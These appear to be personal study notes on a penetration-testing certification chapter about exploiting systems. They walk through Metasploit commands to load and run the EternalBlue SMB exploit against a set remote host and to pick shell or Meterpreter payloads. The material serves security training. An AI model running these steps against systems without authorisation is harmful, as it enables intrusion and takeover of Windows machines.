# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition
# Chapter 5: Exploiting Systems

Common Types of Exploits to gain access to systems
- Server Message Block (SMB), Pass the Hash, Password Cracking, Social Engineering, Man in the Middle (MiTM), Attacks on Physical Security.

## Exploiting System with Metasploit

A list of vuln that can be exploited to gain access to those systems after the vuln scan.
- Metasploit = Most popular exploit tool.


## Metasploit

Kali Linux: `msfconsole`  command.
- type `?` to bring up the help screen

Metasploit Exploit Rankings
- Rank indicates the usual success rate of the exploit.
- Good, Great, or Excellent is a good ranking.

Each exploit = separate module in Metasploit.
- `Search` command to search for your exploit; `> search EternalBlue`.
- `Use` command to use the exploit; `> use exploit/windows/smb/ms_17_010_eternalblue`.
- `show options` command to see what options need to be filled. `> show options`.
  - RHOST = remote host

- `set` command to set the option name for the required option; `> set RHOST 192.168.67.135`.

- `exploit` command to run the exploit; `> exploit`.


WIN text after running the exploit = Windows command prompt of the target system, that you have admin capabilities of the target.

## Setting the Payload

Execute the Payload when you gain access to the system by exploiting the vuln.


Types of payload:
- Bind Shell, Reverse Bind Shell, Meterpreter Shell

Select a payload with `set payload` command.

It's a good idea to use `show options` command to see if there are any payload options that needs to be set after changing the payload.
